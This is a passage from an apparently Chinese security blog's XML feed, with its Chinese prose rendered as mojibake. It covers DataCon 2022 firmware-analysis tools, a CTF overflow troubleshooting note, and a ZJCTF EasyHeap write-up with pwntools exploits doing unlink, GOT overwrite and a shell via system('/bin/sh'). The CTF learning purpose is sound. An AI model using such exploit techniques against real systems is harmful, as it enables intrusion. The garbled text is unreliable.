      <tag>firmware analysis</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>èœé¸¡çš„2022dataconè®°å½•</title>
    <link href="/2022/12/11/%E6%9D%82%E9%A1%B9/%E8%8F%9C%E9%B8%A1%E7%9A%842022datacon/"/>
    <url>/2022/12/11/%E6%9D%82%E9%A1%B9/%E8%8F%9C%E9%B8%A1%E7%9A%842022datacon/</url>
    
    <content type="html"><![CDATA[<h4 id="å›ºä»¶åŸºåœ°å€è¯†åˆ«"><a href="#å›ºä»¶åŸºåœ°å€è¯†åˆ«" class="headerlink" title="å›ºä»¶åŸºåœ°å€è¯†åˆ«"></a>å›ºä»¶åŸºåœ°å€è¯†åˆ«</h4><p>rbasefind - <a href="https://github.com/sgayou/rbasefind">https://github.com/sgayou/rbasefind</a></p><p>æ­¤é¡¹ç›®ç”¨rustå†™çš„ï¼Œç”¨<code>cargo build</code>ä¹‹åä¼šç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶åœ¨<code>target</code>è·¯å¾„ä¸‹</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">rbasefind &lt;<span class="hljs-type">path</span>-<span class="hljs-keyword">to</span>-bin&gt; <br></code></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs sh">Located 4052 strings<br>Located 197089 pointers<br>Scanning with 2 threads...<br>0x2c0dc000: 3818<br>0x2c0dd000: 280<br>0x2c0db000: 274<br>0x2c0da000: 232<br>0x2c0de000: 228<br>0x2c0d7000: 202<br>0x2c0d9000: 200<br>0x2c0df000: 199<br>0x2c0e1000: 184<br>0x2c0e6000: 181<br></code></pre></td></tr></table></figure><p>é€šå¸¸æ¥è®²ç¬¬ä¸€è¡Œï¼ˆä¹Ÿå°±æ˜¯æ•°å­—æœ€å¤§çš„é‚£ä¸ªï¼‰ä¸ºå›ºä»¶çš„åŸºåœ°å€ï¼Œä½†æ˜¯å¾ˆå¤šæ—¶å€™è¯†åˆ«ä¸å‡ºæ¥ï¼ˆæ¯”å¦‚å‡ è¡Œéƒ½æ˜¯1ï¼‰</p><p>å®é™…åœ¨dataconçš„æ•°æ®ä¸Šæµ‹è¯•çš„ç»“æœï¼Œä½¿ç”¨çš„æ—¶å€™æ‰€æœ‰å‚æ•°éƒ½æ˜¯defaultï¼ˆå› ä¸ºå½“æ—¶å¹¶æ²¡æœ‰ä»”ç»†çœ‹ä»£ç â€¦.ï¼‰</p><p><img src="/img/datacon/1.jpg"></p><p>åº”è¯¥æ˜¯50ä¸ªå›ºä»¶è¯†åˆ«æˆåŠŸäº†38ä¸ª</p><h5 id="å¯¹rbasefindæºç çš„åˆ†æ"><a href="#å¯¹rbasefindæºç çš„åˆ†æ" class="headerlink" title="å¯¹rbasefindæºç çš„åˆ†æ"></a>å¯¹rbasefindæºç çš„åˆ†æ</h5><p>æŒ‰ç¨‹åºæ‰§è¡Œé¡ºåºåˆ†æ</p><ol><li><p><code>get_strings()</code></p><p>åˆ©ç”¨ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">[ -~<span class="hljs-symbol">\t</span>\r<span class="hljs-symbol">\n</span>]&#123;10,&#125;  // ä»ç©ºæ ¼(48)åˆ°åˆ¶è¡¨ç¬¦(126) ä»¥åŠ \r<span class="hljs-symbol">\n</span> çš„æ‰€æœ‰æœ‰æ•ˆå­—ç¬¦ <br></code></pre></td></tr></table></figure><p>é•¿åº¦è‡³å°‘æ˜¯10çš„å­—ç¬¦ä¸²ï¼ˆ10ä¸ºå‚æ•°minstrlenï¼Œæœ€å°å­—ç¬¦ä¸²æœç´¢é•¿åº¦ï¼‰</p></li><li><p><code>get_pointers()</code></p><p>æå–æ•´ä¸ªæ–‡ä»¶çš„u32ï¼ˆï¼Ÿï¼‰ï¼Œä¼šæ ¹æ®å‚æ•°<code>big_endian</code>åˆ¤æ–­æ–‡ä»¶çš„å¤§å°ç«¯</p></li><li><p><code>find_match() -&gt; Interval::get_range()</code></p><p>æŠŠ32ä½åœ°å€ç©ºé—´å¹³å‡åˆ†ä¸ºnéƒ¨åˆ†ï¼Œnä½å‚æ•°çš„threadsï¼ˆå¼€å¯çš„çº¿ç¨‹æ•°ï¼‰</p></li><li><p>æ¯ä¸€ä¸ªintervalå¯¹åº”ä¸€ä¸ªçº¿ç¨‹ï¼Œä»¥offsetå­—èŠ‚ä¸ºä¸€ç»„ï¼ˆoffsetä¸ºè¾“å…¥çš„å‚æ•°ï¼Œé»˜è®¤ä¸º4096ï¼‰</p></li><li><p>ä¸‹é¢çš„ä»£ç ä¸­current_addréå†äº†<code> [interval.start_addr : interval.end_addr : offset]</code></p><p>å°†æ¯ä¸ªstrçš„é¦–åœ°å€åŠ ä¸Šcurrent_addrï¼ŒæŠŠè¿™äº›åœ°å€å’Œpointersé›†åˆå–äº¤é›†</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">while</span> current_addr &lt;= interval.end_addr &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">news</span> = FnvHashSet::<span class="hljs-title function_ invoke__">default</span>();<br>    <span class="hljs-keyword">for</span> <span class="hljs-variable">s</span> <span class="hljs-keyword">in</span> strings &#123;<br>        <span class="hljs-keyword">match</span> s.<span class="hljs-title function_ invoke__">checked_add</span>(current_addr) &#123;<br>            <span class="hljs-title function_ invoke__">Some</span>(add) =&gt; news.<span class="hljs-title function_ invoke__">insert</span>(add),<br>            <span class="hljs-literal">None</span> =&gt; <span class="hljs-keyword">continue</span>,<br>        &#125;;<br>    &#125;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">intersection</span>: FnvHashSet&lt;_&gt; = news.<span class="hljs-title function_ invoke__">intersection</span>(pointers).<span class="hljs-title function_ invoke__">collect</span>();<br>    <span class="hljs-keyword">if</span> !intersection.<span class="hljs-title function_ invoke__">is_empty</span>() &#123;<br>        heap.<span class="hljs-title function_ invoke__">push</span>((intersection.<span class="hljs-title function_ invoke__">len</span>(), current_addr));<br>    &#125;<br>    <span class="hljs-keyword">match</span> current_addr.<span class="hljs-title function_ invoke__">checked_add</span>(config.offset) &#123;<br>        <span class="hljs-title function_ invoke__">Some</span>(_) =&gt; current_addr += config.offset,<br>        <span class="hljs-literal">None</span> =&gt; <span class="hljs-keyword">break</span>,<br>    &#125;;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>å–å‡ºäº¤é›†sizeæœ€å¤§çš„top nä¸ªcurrent_addrè¿›è¡Œè¾“å‡º</p><p>è§æœ¬èŠ‚æœ€å¼€å¤´çš„ç¤ºä¾‹ï¼Œè¾“å‡ºæ ¼å¼ä¸º addr :  interaction_size</p><p>sizeæœ€å¤§çš„å³è®¤ä¸ºæ˜¯æœ€æœ‰å¯èƒ½çš„åŸºåœ°å€</p><p><strong>ç›®å‰å°šä¸æ¸…æ¥šè¿™æ ·åšçš„é“ç†æ˜¯ä»€ä¹ˆ</strong></p><p>çŒœæµ‹ï¼šé¦–å…ˆï¼ŒåŸºåœ°å€æ˜¯ä¸€ä¸ªoffsetçš„å€æ•°ï¼Œé‚£ä¹ˆéå†0~2^32æ‰€æœ‰offsetçš„å€æ•°ï¼ˆä¹Ÿå°±æ˜¯current_offsetï¼‰ï¼Œå­—ç¬¦ä¸²åœ¨ç¨‹åºè¿è¡Œæ—¶ä¼šè¢«è£…è½½åˆ°åŸºåœ°å€åé¢çš„ä¸€æ®µç©ºé—´å†…ï¼Œè€Œpointersé‡Œä¼šæœ‰å¾ˆå¤šæŒ‡å‘å­—ç¬¦ä¸²çœŸå®åœ°å€çš„æŒ‡é’ˆï¼Œå¦‚æœèƒ½å°†stringså’ŒpointersåŒ¹é…ä¸Šå¾ˆå¤šï¼Œè¯´æ˜è¿™ä¸ªcurrent_addrå°±æ˜¯ç¨‹åºçš„åŸºåœ°å€</p><p>ï¼ˆçº¯ççŒœğŸ’”ï¼‰</p></li></ol><h4 id="å‡½æ•°ç¬¦å·æ¢å¤"><a href="#å‡½æ•°ç¬¦å·æ¢å¤" class="headerlink" title="å‡½æ•°ç¬¦å·æ¢å¤"></a>å‡½æ•°ç¬¦å·æ¢å¤</h4><h5 id="å‡ ä¸ªå·²çŸ¥çš„æ–¹æ³•"><a href="#å‡ ä¸ªå·²çŸ¥çš„æ–¹æ³•" class="headerlink" title="å‡ ä¸ªå·²çŸ¥çš„æ–¹æ³•"></a>å‡ ä¸ªå·²çŸ¥çš„æ–¹æ³•</h5><p>æˆ‘è®¤ä¸ºè¿™ç¯‡æ–‡ç« å†™çš„å¾ˆä¸é”™ <a href="https://blog.csdn.net/abel_big_xu/article/details/124388798">https://blog.csdn.net/abel_big_xu/article/details/124388798</a></p><ol><li><p>FLIRT</p><p>idaè‡ªå¸¦çš„ä¸€ä¸ªæ’ä»¶ï¼ŒFLIRTå¯ä»¥å¯¹æŸä¸ªé™æ€å‡½æ•°åº“ç”Ÿæˆç­¾åï¼Œç„¶åå’Œå¾…åˆ†æçš„ç¨‹åºåŒ¹é…</p><p>ç¼ºç‚¹åœ¨äºéœ€è¦å·²çŸ¥åº“å‡½æ•°æ–‡ä»¶</p></li><li><p>lscan   </p><p><a href="https://github.com/maroueneboubakri/lscan">https://github.com/maroueneboubakri/lscan</a>ï¼ˆæˆ‘å’Œå‰é¢æŒ‚ç€çš„é‚£ç¯‡csdnæ–‡ç« ä½œè€…ä¸€æ ·ï¼Œæ²¡ææ‡‚è¿™ä¸ªå·¥å…·ï¼‰</p><p>lscanç®—æ˜¯å¯¹flirtè¿›è¡Œäº†ä¸€ä¸ªåŒ…è£…ï¼Œåªè¦æŠŠä¸€å †é™æ€åº“æ”¾åœ¨ä¸€ä¸ªæ–‡ä»¶å¤¹é‡Œï¼Œä»–ä¼šéå†è¿™ä¸ªæ–‡ä»¶å¤¹å¯¹æ¯ä¸ªé™æ€åº“ç”Ÿæˆç­¾åï¼Œç„¶åå†ç”¨FLIRTè¿›è¡Œæ¯”å¯¹</p><p>lscané¡¹ç›®é‡Œè‡ªå¸¦çš„ä¸€äº›é™æ€åº“æ˜¯å¯ä»¥æˆåŠŸè¿è¡Œçš„ï¼Œä½†æ˜¯æˆ‘è¯•äº†ä¸€ä¸‹å†™çš„é™æ€åº“ï¼Œä¾‹å¦‚sigdatabase <a href="https://github.com/push0ebp/sig-database">https://github.com/push0ebp/sig-database</a> è¿è¡Œä¼šæŠ¥é”™</p><p>ç„¶åè¿˜æœ‰ä¸€ä¸ªå¾ˆå¥‡æ€ªçš„ç‚¹åœ¨äºåŒ¹é…æ—¶å¯¹äºæŸä¸ªåº“çš„ç›¸ä¼¼åº¦ä¼šè¶…è¿‡ç™¾åˆ†ä¹‹100%ï¼ˆåœ¨lscançš„issueé‡Œä¹Ÿæœ‰äººæåˆ°ï¼‰ï¼Œä½†å®é™…ç”¨idaçš„flirtæ‰“å¼€æ—¶è¿™ä¸ªåº“å¹¶ä¸èƒ½å¾ˆå¥½åœ°åŒ¹é…åˆ†ææ–‡ä»¶</p></li><li><p>Rizzo</p><p>æ²¡å®é™…æµ‹è¯•è¿‡ï¼Œç•¥</p></li><li><p>finger</p><p>fingeræ˜¯é˜¿é‡Œäº‘å¼€å‘çš„idaæ’ä»¶  -  <a href="https://github.com/aliyunav/Finger">https://github.com/aliyunav/Finger</a></p><p>ç”¨èµ·æ¥å¾ˆç®€å•</p></li><li><p>lumina </p><p>æ²¡æœ‰æµ‹è¯•è¿‡ï¼Œidaçš„ä¸€ä¸ªå®˜æ–¹ç¬¦å·è¯†åˆ«æ’ä»¶ï¼Œéœ€è¦è¿œç¨‹è¿æ¥åˆ°ida luminaçš„æœåŠ¡å™¨</p><p>æœ‰ä¸€ä¸ªå±±å¯¨ç‰ˆçš„æœåŠ¡å™¨lumenï¼Œå¯ä»¥æ›¿ä»£luminaï¼Œä½†å¥½åƒç°åœ¨å·²ç»ä¸å¥½ä½¿äº†</p></li></ol><h5 id="åœ¨dataconç¬¦å·æ¢å¤æ•°æ®é›†ä¸Šçš„å®æµ‹"><a href="#åœ¨dataconç¬¦å·æ¢å¤æ•°æ®é›†ä¸Šçš„å®æµ‹" class="headerlink" title="åœ¨dataconç¬¦å·æ¢å¤æ•°æ®é›†ä¸Šçš„å®æµ‹"></a>åœ¨dataconç¬¦å·æ¢å¤æ•°æ®é›†ä¸Šçš„å®æµ‹</h5><p>ç»™äº†20ä¸ªç¨‹åºï¼Œåªæœ‰ä¸€ä¸ªx86çš„ç¨‹åºï¼Œç”¨fingeråŸºæœ¬èƒ½è¯†åˆ«å‡ºæ¥ï¼Œæœ‰å‡ ä¸ªarmã€mipsçš„ç¨‹åºï¼Œè¿˜æœ‰å…¶ä»–å¾ˆå¤šå¥‡å¥‡æ€ªæ€ªçš„å¹³å°idaéƒ½åæ±‡ç¼–ä¸äº†ï¼Œè·Ÿä¸ç”¨è¯´ç¬¦å·æ¢å¤äº†ï¼Œå¯„</p><h4 id="powershellåæ··æ·†"><a href="#powershellåæ··æ·†" class="headerlink" title="powershellåæ··æ·†"></a>powershellåæ··æ·†</h4><p>PowerDecode  -  <a href="https://github.com/Malandrone/PowerDecode">https://github.com/Malandrone/PowerDecode</a></p><p>å¯¹äºå•ä¸ªæ–‡ä»¶åæ··æ·†å¾ˆå¥½ç”¨ï¼Œè€Œä¸”å®æµ‹æ¯”ä¸‹è¾¹é‚£ä¸ªå·¥å…·æ•ˆæœè¦å¥½</p><p>ä½†æ˜¯é—®é¢˜åœ¨äºï¼Œå®ƒæä¾›çš„â€œåˆ†ææ•´ä¸ªæ–‡ä»¶å¤¹ä¸‹æ‰€æœ‰æ–‡ä»¶â€åŠŸèƒ½ï¼Œè¾“å‡ºç»“æœå…¨æ˜¯ 1.txt 2.txt 3.txt â€¦..</p><p>ç„¶åè¿™äº›txté‡Œä¹Ÿçœ‹ä¸å‡ºæ¥å¯¹åº”ç€å“ªä¸ªpwshè„šæœ¬ï¼Œä¸€å¼€å§‹æƒ³ç€æ˜¯ä¸æ˜¯æ–‡ä»¶åç§°æ’åˆ—çš„é¡ºåºï¼Œä½†å¥½åƒä¸å¯¹ï¼Œä»£ç å…¨æ˜¯powershellå†™çš„ï¼Œä¹Ÿæ²¡ææ‡‚è¯¥å’‹åŠ</p><p>å› æ­¤åªèƒ½æ¢äº†ç¬¬äºŒä¸ªå·¥å…·</p><p>PSDecode - <a href="https://github.com/R3MRUM/PSDecode">https://github.com/R3MRUM/PSDecode</a> </p><p>ä¼šåœ¨TEMPè·¯å¾„ä¸‹ç•™ä¸‹è§£æè¿‡ç¨‹ä¸­å„ä¸ªlayerçš„æ•°æ®</p><p><img src="/img/datacon/2.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>æ‚é¡¹</category>
      
    </categories>
    
    
    <tags>
      
      <tag>exp</tag>
      
      <tag>datacon</tag>
      
      <tag>iot-sec</tag>
      
      <tag>powershell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>é‡åˆ°çš„å¥‡å¥‡æ€ªæ€ªé—®é¢˜æ±‡æ€»</title>
    <link href="/2022/11/29/%E6%9D%82%E9%A1%B9/%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/"/>
    <url>/2022/11/29/%E6%9D%82%E9%A1%B9/%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/</url>
    
    <content type="html"><![CDATA[<h4 id="sleep-ï¼Ÿ"><a href="#sleep-ï¼Ÿ" class="headerlink" title="sleep ï¼Ÿ"></a>sleep ï¼Ÿ</h4><p>é¢˜ç›®ï¼š</p><p><a href="https://buuoj.cn/challenges#mrctf2020_easyrop">https://buuoj.cn/challenges#mrctf2020_easyrop</a></p><p>æœ¬æ¥æ˜¯å¾ˆç®€å•çš„ä¸€ä¸ªæº¢å‡º</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<br><span class="hljs-comment">#r = process(&#x27;./mrctf2020_easyrop&#x27;)</span><br>r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25663</span>)<br>system_sh =<span class="hljs-number">0x000000000040072A</span><br>r.sendline(<span class="hljs-string">b&#x27;2&#x27;</span>)<br><span class="hljs-comment">#sleep(1)</span><br>r.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x300</span>)<br>r.sendline(<span class="hljs-string">b&#x27;7&#x27;</span>)<br><span class="hljs-comment">#sleep(1)</span><br>r.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>* <span class="hljs-number">0x12</span> + p64(system_sh))<br>r.interactive()<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯ä¸åŠ sleepæ— æ³•é€šè¿‡</p><p>æœ‰äººè¯´æ˜¯pythonåŒæ—¶å‘é€å¤šä¸ªå­—ç¬¦ä¸²æ—¶ä¼šåˆå¹¶(?)</p><p>é‚£ä»€ä¹ˆæ—¶å€™æƒ…å†µä¸‹éœ€è¦åœ¨sendlineå‰é¢åŠ ä¸€ä¸ªsleep</p><p>â€‹    [å·²è§£å†³] æ‰“æœ¬åœ°ä¸åŠ åº”è¯¥æ²¡äº‹ï¼Œæ‰“è¿œç¨‹çš„æ—¶å€™è‚¯å®šä¼šæœ‰ä¸€ç‚¹å»¶è¿Ÿï¼Œå‡å¦‚æ²¡æœ‰sendafterè¿™ä¸€ç±»çš„å‘é€ï¼Œå°±å¯èƒ½ä¼šé€ æˆåé¢çš„ä¹Ÿä¸€èµ·å‘é€äº†ï¼Œæ‰€ä»¥æ¯æ¬¡å†™expå‘é€çš„æ—¶å€™æœ€å¥½ç”¨sendafteræˆ–è€…sendlineafterè¿™æ ·çš„è¯å°±ä¸éœ€è¦å†æ‹…å¿ƒsleep(1)äº†</p><hr><h4 id="binwalkæå–å›ºä»¶æ—¶å¿«æ·æ–¹å¼æŒ‡å‘-dev-null"><a href="#binwalkæå–å›ºä»¶æ—¶å¿«æ·æ–¹å¼æŒ‡å‘-dev-null" class="headerlink" title="binwalkæå–å›ºä»¶æ—¶å¿«æ·æ–¹å¼æŒ‡å‘/dev/null"></a>binwalkæå–å›ºä»¶æ—¶å¿«æ·æ–¹å¼æŒ‡å‘/dev/null</h4><p>binwalkæå–å›ºä»¶æ—¶ä¼šæœ‰ä¸€ä¸ªwarning</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">WARNING: Symlink points outside of the extraction directory: <span class="hljs-regexp">/home/</span>kali<span class="hljs-regexp">/Desktop/</span>dir815_FW_101<span class="hljs-regexp">/_DIR-815 FW 1.01b14_1.01b14.bin.extracted/</span>squashfs-root<span class="hljs-regexp">/htdocs/</span>web<span class="hljs-regexp">/dlcfg.cgi -&gt; /</span>htdocs<span class="hljs-regexp">/cgibin; changing link target to /</span>dev/<span class="hljs-keyword">null</span> <span class="hljs-keyword">for</span> security purposes.<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>æ‚é¡¹</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
      <tag>Others</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ZJCTF 2019 EasyHeap</title>
    <link href="/2022/11/29/ctf-pwn/%5BZJCTF%202019%5DEasyHeap/"/>
    <url>/2022/11/29/ctf-pwn/%5BZJCTF%202019%5DEasyHeap/</url>
    
    <content type="html"><![CDATA[<h4 id="é¢˜ç›®é“¾æ¥"><a href="#é¢˜ç›®é“¾æ¥" class="headerlink" title="é¢˜ç›®é“¾æ¥"></a>é¢˜ç›®é“¾æ¥</h4><p><a href="https://buuoj.cn/challenges#[ZJCTF%202019]EasyHeap">https://buuoj.cn/challenges#[ZJCTF%202019]EasyHeap</a></p><h4 id="æ¼æ´"><a href="#æ¼æ´" class="headerlink" title="æ¼æ´"></a>æ¼æ´</h4><p>å¾ˆæ˜æ˜¾åœ¨<code>ceate_heap</code>ä¸­sizeå¹¶æ²¡æœ‰å­˜ä¸‹æ¥ï¼Œç„¶å<code>edit_heap</code>æ—¶ä¹Ÿæ˜¯ç”¨æˆ·è‡ªå·±è¾“å…¥sizeæ¥ç¼–è¾‘</p><p>å› æ­¤å¯ä»¥æº¢å‡º</p><h4 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h4><p>checksecå‘ç°æ²¡æœ‰å¼€å¯PIEï¼Œheaparrayçš„åœ°å€å¯ä»¥ç›´æ¥ä½¿ç”¨</p><ol><li><p>é¦–å…ˆç”³è¯·ä¸‰ä¸ªchunk</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x90</span>,<span class="hljs-string">b&quot;MMMM&quot;</span>)<br>add(<span class="hljs-number">0x90</span>,<span class="hljs-string">b&quot;MMMM&quot;</span>)<br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>)<br></code></pre></td></tr></table></figure></li><li><p>æ„é€ ä¸€ä¸ªunlinkéœ€è¦åœ¨ç¬¬ä¸€ä¸ªchunkå†…æ„é€ ä¸€ä¸ªfakechunk</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">fake_chunk = p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x91</span>) + p64(heaparray_addr-<span class="hljs-number">0x18</span>) + p64(heaparray_addr-<span class="hljs-number">0x10</span>)<br>fake_chunk = fake_chunk.ljust(<span class="hljs-number">0x90</span>,<span class="hljs-string">b&#x27;M&#x27;</span>)<br>fake_chunk += p64(<span class="hljs-number">0x90</span>) + p64(<span class="hljs-number">0xa0</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x100</span>,fake_chunk)<br></code></pre></td></tr></table></figure><p><img src="/img/%5BZJCTF2019%5DEasyHeap/1.jpg"></p><p>å¯¹äºchunk 0ï¼Œ<code>fd = heaparray - 0x18</code> <code>bk = heaparray - 0x10</code>ï¼Œunlink chunk 0 æ—¶ä¼šå°†heaparray[0]æŒ‡å‘<code>heaparray - 0x18</code></p></li><li><p>è¿™æ—¶delete(1)ï¼Œä¼šå°†chunk 1 å’Œ fakechunk åˆå¹¶èµ·æ¥æ”¾å…¥ unsorted bin</p><p><img src="/img/%5BZJCTF2019%5DEasyHeap/2.jpg"></p><p>æŸ¥çœ‹heaparrayåœ°å€ä¸Šçš„å€¼ï¼š</p><p><img src="/img/%5BZJCTF2019%5DEasyHeap/3.jpg"></p><p>è¯´æ˜fakechunkæˆåŠŸå®Œæˆunlinkæ“ä½œï¼Œheaparray[0]æŒ‡å‘äº†0x6020c8</p></li><li><p>è¿™æ—¶edit(0)ä¼šä»0x6020c8è¿™ä¸ªåœ°å€å¼€å§‹å†™ï¼Œå› æ­¤</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> +p64(free_got)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x20</span> ,payload)<br></code></pre></td></tr></table></figure><p>åˆä¸€æ¬¡è¦†ç›–äº†heaparray[0]ï¼ŒæŒ‡å‘äº†<code>free@got</code></p></li><li><p>è¿™æ—¶edit(0)ä¼šä¿®æ”¹<code>free@got</code>çš„å†…å®¹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">edit(<span class="hljs-number">0</span>,<span class="hljs-number">8</span>,p64(system_plt))<br></code></pre></td></tr></table></figure><p>å°†å…¶å‡½æ•°æ”¹ä¸ºsystemå‡½æ•°çš„pltè¡¨</p><blockquote><p>å› ä¸ºsystemæ²¡æœ‰è¢«è°ƒç”¨è¿‡ï¼Œä¸èƒ½ç›´æ¥æ”¹æˆsystem@got</p></blockquote></li><li><p>delete(2)ä¼šè°ƒç”¨free(â€œ/bin/shâ€)ï¼Œè€Œfreeå‡½æ•°è¢«æ›¿æ¢æˆäº†systemï¼Œå› æ­¤å¾—åˆ°äº†shell</p></li></ol><h4 id="å®Œæ•´exp"><a href="#å®Œæ•´exp" class="headerlink" title="å®Œæ•´exp"></a>å®Œæ•´exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>r = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">27679</span>)<br>elf = ELF(<span class="hljs-string">&quot;./easyheap&quot;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    r.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)<br>    r.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    r.recvuntil(<span class="hljs-string">&quot;Size of Heap : &quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(size))<br>    r.recvuntil(<span class="hljs-string">&quot;Content of heap:&quot;</span>)<br>    r.sendline(content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx, size, content</span>):<br>    r.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)<br>    r.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>    r.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(idx))<br>    r.recvuntil(<span class="hljs-string">&quot;Size of Heap : &quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(size))<br>    r.recvuntil(<span class="hljs-string">&quot;Content of heap : &quot;</span>)<br>    r.sendline(content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    r.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)<br>    r.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>    r.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>heaparray_addr = <span class="hljs-number">0x6020E0</span><br>system_plt = elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>]<br>free_got = elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br><br>add(<span class="hljs-number">0x90</span>,<span class="hljs-string">b&quot;MMMM&quot;</span>)<br>add(<span class="hljs-number">0x90</span>,<span class="hljs-string">b&quot;MMMM&quot;</span>)<br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>)<br><span class="hljs-comment">#gdb.attach(r)</span><br><br>fake_chunk = p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x91</span>) + p64(heaparray_addr-<span class="hljs-number">0x18</span>) + p64(heaparray_addr-<span 